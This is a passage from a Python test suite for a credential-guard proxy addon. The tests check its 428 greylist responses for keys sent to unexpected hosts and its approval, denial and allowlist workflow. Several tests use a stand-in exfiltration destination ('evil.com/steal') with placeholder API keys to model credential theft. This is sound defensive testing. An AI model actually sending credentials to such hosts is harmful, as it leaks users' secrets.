        assert context["reason"] == "not_in_policy"


class Test428Responses:
    """Test 428 greylist response builders."""

    def test_destination_mismatch_response_format(self):
        """Type 1 response has correct structure."""
        from addons.credential_guard import create_destination_mismatch_response
        import json

        response = create_destination_mismatch_response(
            credential_type="openai",
            destination_host="api.openai-typo.com",
            expected_hosts=["api.openai.com"],
            suggested_url="https://api.openai.com",
            credential_fingerprint="hmac:abc123",
            path="/v1/chat/completions"
        )

        assert response.status_code == 428
        body = json.loads(response.content)

        assert body["error"] == "credential_destination_mismatch"
        assert body["action"] == "self_correct"
        assert body["blocked"]["credential_type"] == "openai"
        assert body["blocked"]["destination"] == "api.openai-typo.com"
        assert "api.openai.com" in body["expected"]["hosts"]
        assert "reflection_prompt" in body
        assert "HALLUCINATION" in body["reflection_prompt"]

    def test_requires_approval_response_format(self):
        """Type 2 response has correct structure."""
        from addons.credential_guard import create_requires_approval_response
        import json

        response = create_requires_approval_response(
            credential_type="unknown_secret",
            destination_host="internal-api.company.com",
            credential_fingerprint="hmac:xyz789",
            path="/v1/data",
            reason="unknown_credential_type",
            approval_token="cap_abc123"
        )

        assert response.status_code == 428
        body = json.loads(response.content)

        assert body["error"] == "credential_requires_approval"
        assert body["action"] == "wait_for_approval"
        assert body["blocked"]["credential_type"] == "unknown_secret"
        assert body["blocked"]["reason"] == "unknown_credential_type"
        assert "policy_snippet" in body
        assert body["policy_snippet"]["credential_fingerprint"] == "hmac:xyz789"
        assert "retry_strategy" in body
        assert body["retry_strategy"]["interval_seconds"] == 30
        assert "approval" in body
        assert body["approval"]["token"] == "cap_abc123"

    def test_end_to_end_greylist_mismatch(self, credential_guard, make_flow):
        """Test full flow for destination mismatch."""
        import json

        flow = make_flow(
            method="POST",
            url="https://api.openai-typo.com/v1/chat/completions",
            headers={"Authorization": "Bearer sk-proj-abc123xyz456def789ghijk"}
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 428

        body = json.loads(flow.response.content)
        assert body["error"] == "credential_destination_mismatch"
        assert body["action"] == "self_correct"
        assert "api.openai.com" in body["expected"]["hosts"]

    def test_end_to_end_greylist_approval(self, credential_guard, make_flow):
        """Test full flow for unknown credential requiring approval."""
        import json

        flow = make_flow(
            method="POST",
            url="https://internal-api.company.com/v1/data",
            headers={"X-API-Key": "custom-secret-key-abc123xyz456def789"}
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 428

        body = json.loads(flow.response.content)
        assert body["error"] == "credential_requires_approval"
        assert body["action"] == "wait_for_approval"
        assert body["blocked"]["credential_type"] == "unknown_secret"


class TestApprovalWorkflow:
    """Test Phase 4: Pending approvals and approval workflow."""

    def test_generate_approval_token(self, credential_guard):
        """Test that approval tokens are generated correctly."""
        token1 = credential_guard._generate_approval_token()
        token2 = credential_guard._generate_approval_token()

        # Tokens should be unique
        assert token1 != token2

        # Tokens should be URL-safe (no special chars that need encoding)
        assert all(c.isalnum() or c in '-_' for c in token1)
        assert all(c.isalnum() or c in '-_' for c in token2)

        # Should be reasonably long (32 bytes = ~43 base64 chars)
        assert len(token1) >= 40
        assert len(token2) >= 40

    def test_create_pending_approval(self, credential_guard):
        """Test creating a pending approval request."""
        token = credential_guard.create_pending_approval(
            credential="sk-proj-test123abc456",
            credential_type="openai",
            host="evil.com",
            path="/steal",
            reason="not_in_policy",
            confidence="high",
            tier=1
        )

        # Token should be returned
        assert token is not None
        assert len(token) >= 40

        # Should be stored in pending_approvals
        assert token in credential_guard.pending_approvals

        # Check stored data
        pending = credential_guard.pending_approvals[token]
        assert pending["credential_type"] == "openai"
        assert pending["host"] == "evil.com"
        assert pending["path"] == "/steal"
        assert pending["reason"] == "not_in_policy"
        assert pending["confidence"] == "high"
        assert pending["tier"] == 1
        assert pending["status"] == "pending"

        # Credential should be HMAC fingerprinted, not stored raw
        assert "credential_fingerprint" in pending
        assert pending["credential_fingerprint"] != "sk-proj-test123abc456"
        assert len(pending["credential_fingerprint"]) == 16  # HMAC truncated to 16 chars

    def test_approve_pending_success(self, credential_guard):
        """Test approving a pending request."""
        # Create a pending approval
        token = credential_guard.create_pending_approval(
            credential="sk-proj-approve123",
            credential_type="openai",
            host="api.openai.com",
            path="/v1/chat",
            reason="not_in_policy"
        )

        fingerprint = credential_guard.pending_approvals[token]["credential_fingerprint"]

        # Approve it
        success = credential_guard.approve_pending(token)

        assert success is True

        # Should be removed from pending_approvals
        assert token not in credential_guard.pending_approvals

        # Should be added to temp_allowlist with HMAC fingerprint
        allowlist_key = (fingerprint, "api.openai.com")
        assert allowlist_key in credential_guard.temp_allowlist

        # Should have an expiry time
        expiry = credential_guard.temp_allowlist[allowlist_key]
        assert expiry > 0

    def test_approve_pending_not_found(self, credential_guard):
        """Test approving a non-existent token."""
        success = credential_guard.approve_pending("nonexistent-token-12345")
        assert success is False

    def test_deny_pending_success(self, credential_guard):
        """Test denying a pending request."""
        # Create a pending approval
        token = credential_guard.create_pending_approval(
            credential="sk-proj-deny123",
            credential_type="openai",
            host="evil.com",
            path="/steal",
            reason="not_in_policy"
        )

        fingerprint = credential_guard.pending_approvals[token]["credential_fingerprint"]

        # Deny it
        success = credential_guard.deny_pending(token)

        assert success is True

        # Should be removed from pending_approvals
        assert token not in credential_guard.pending_approvals

        # Should NOT be added to temp_allowlist
        allowlist_key = (fingerprint, "evil.com")
        assert allowlist_key not in credential_guard.temp_allowlist

    def test_deny_pending_not_found(self, credential_guard):
        """Test denying a non-existent token."""
        success = credential_guard.deny_pending("nonexistent-token-67890")
        assert success is False

    def test_get_pending_approvals_empty(self, credential_guard):
        """Test getting pending approvals when none exist."""
        pending = credential_guard.get_pending_approvals()
        assert pending == []

    def test_get_pending_approvals_with_data(self, credential_guard):
        """Test getting pending approvals with data."""
        # Create multiple pending approvals
        token1 = credential_guard.create_pending_approval(
            credential="sk-proj-test1",
            credential_type="openai",
            host="host1.com",
            path="/path1",
            reason="not_in_policy"
        )

        token2 = credential_guard.create_pending_approval(
            credential="sk-ant-test2",
            credential_type="anthropic",
            host="host2.com",
            path="/path2",
            reason="unknown_credential_type",
            confidence="medium",
            tier=2
        )

        pending = credential_guard.get_pending_approvals()

        assert len(pending) == 2

        # Check format of returned data
        for item in pending:
            assert "token" in item
            assert "credential_fingerprint" in item
            assert "credential_type" in item
            assert "host" in item
            assert "path" in item
            assert "reason" in item
            assert "confidence" in item
            assert "tier" in item
            assert "age_seconds" in item
            assert "status" in item

            # Credential fingerprint should be in hmac:xxx format
            assert item["credential_fingerprint"].startswith("hmac:")

        # Check specific values
        tokens = [item["token"] for item in pending]
        assert token1 in tokens
        assert token2 in tokens

    def test_get_pending_approvals_cleanup_expired(self, credential_guard):
        """Test that expired pending approvals are cleaned up."""
        import time

        # Create a pending approval
        token = credential_guard.create_pending_approval(
            credential="sk-proj-old",
            credential_type="openai",
            host="old.com",
            path="/old",
            reason="test"
        )

        # Manually set timestamp to >24 hours ago
        credential_guard.pending_approvals[token]["timestamp"] = time.time() - 86400 - 1

        # Call get_pending_approvals (should trigger cleanup)
        pending = credential_guard.get_pending_approvals()

        # Should be empty (expired approval cleaned up)
        assert len(pending) == 0
        assert token not in credential_guard.pending_approvals

    def test_full_approval_workflow_integration(self, credential_guard, make_flow):
        """Test full workflow: detection → pending → approval → allowlist."""
        # Make a request with unknown credential to trigger greylist_approval
        flow = make_flow(
            method="POST",
            url="https://custom-api.example.com/endpoint",
            headers={"X-API-Key": "custom-high-entropy-secret-key-abc123xyz456"}
        )

        credential_guard.request(flow)

        # Should get 428 response
        assert flow.response is not None
        assert flow.response.status_code == 428

        body = json.loads(flow.response.content)
        assert body["error"] == "credential_requires_approval"

        # Should have created a pending approval
        approval_token = body["approval"]["token"]
        assert approval_token != "pending"  # Should be a real token now
        assert len(credential_guard.pending_approvals) == 1

        # Approve the request
        success = credential_guard.approve_pending(approval_token)
        assert success is True

        # Should be in temp allowlist now
        allowlist = credential_guard.get_temp_allowlist()
        assert len(allowlist) == 1
        assert allowlist[0]["host"] == "custom-api.example.com"

        # Retry the request - should now be allowed
        flow2 = make_flow(
            method="POST",
            url="https://custom-api.example.com/endpoint",
            headers={"X-API-Key": "custom-high-entropy-secret-key-abc123xyz456"}
        )

        credential_guard.request(flow2)

        # Should NOT be blocked this time
        assert flow2.response is None  # No 428 response
        assert flow2.metadata.get("credguard_allowlisted") is True

    def test_full_denial_workflow_integration(self, credential_guard, make_flow):
        """Test full workflow: detection → pending → denial → still blocked."""
        # Make a request to trigger greylist_approval
        flow = make_flow(
            method="POST",
            url="https://suspicious.com/endpoint",
            headers={"X-API-Key": "suspicious-secret-abc123xyz456def789"}
        )

        credential_guard.request(flow)

        # Should get 428 response
        assert flow.response is not None
        assert flow.response.status_code == 428

        body = json.loads(flow.response.content)
        approval_token = body["approval"]["token"]

        # Deny the request
        success = credential_guard.deny_pending(approval_token)
        assert success is True

        # Should NOT be in temp allowlist
        allowlist = credential_guard.get_temp_allowlist()
        assert len(allowlist) == 0

        # Retry the request - should still be blocked
        flow2 = make_flow(
            method="POST",
            url="https://suspicious.com/endpoint",
            headers={"X-API-Key": "suspicious-secret-abc123xyz456def789"}
        )

        credential_guard.request(flow2)

        # Should be blocked again (new pending approval created)
        assert flow2.response is not None
        assert flow2.response.status_code == 428
